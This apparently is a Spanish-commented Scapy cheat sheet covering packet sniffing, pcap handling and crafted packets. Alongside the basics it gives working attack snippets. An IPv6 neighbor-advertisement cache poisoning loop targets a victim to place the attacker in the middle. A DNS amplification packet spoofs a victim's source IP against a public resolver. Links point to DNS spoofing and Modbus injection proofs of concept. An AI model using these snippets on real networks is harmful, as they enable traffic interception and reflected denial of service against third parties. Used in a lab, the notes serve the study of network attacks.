ls()
lsc()
conf
conf.route

packet = Ether()/IP(dst="google.com")/ICMP()/"ABCD"
ls(packet)
sendp(packet loop=1, count=3, inter=3)
response = srp1(packet)
ls(response)
response.show()
packet.summary()


packets = sniff(iface="wlan0", count=500, filter="tcp")
ppackets
len(packets)
packet[4]
wrpcap("/tmp/demo.pcap", packets)
rdpcap("/tmp/demo.pcap")


packets = sniff(iface="wlan0", count=3, prn=lambda x:x.summary(), filter="icmp")



https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py



ether = Ether(src="08:00:27:c5:6b:6c", dst="08:00:27:10:b8:d0")  # MAC origen (atacante) y destino (víctima)
ipv6 = IPv6(src="fe80::d5d4:8c8c:648a:adcb", dst="2001:aaa:bbb:ccc::33")  # Direción IPv6 origen y destino
na = ICMPv6ND_NA(tgt="2001:aaa:bbb:ccc::1", R=0)  # tgt indica la cache víctima a envenenar
lla = ICMPv6NDOptDstLLAddr(lladdr="08:00:27:c5:6b:6c")  # Dirección física que queremos que tenga (atacante)
(ether/ipv6/na/lla).display()
sendp(ether/ipv6/na/lla, iface="enp0s3", loop=1, inter=5)  # loop=1 en forma continua cada 5 seg


Fragmentacion

p = IPv6(dst="")/IPv6ExtHdrFragment()/ICMPv6EchoRequest()/Raw(load="A"*400) # paquete muy graande que queremos enviar a la red

fr = fragment6(p, 100) # fragmenta el paquete grande en 100bytes
for i in fr:
    send(i, iface="eth0")


DNS Amplification
packet = IP(dst="8.8.8.8", src="victimIP")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="fwhibbit.es", qtype=255)) # dig ANY fwhibbit.es @8.8.8.8  # qtype 255 es como el ANY (toda la info posible)
send(packet)


MODBUS
https://rodrigocantera.com/en/modbus-tcp-packet-injection-with-scapy/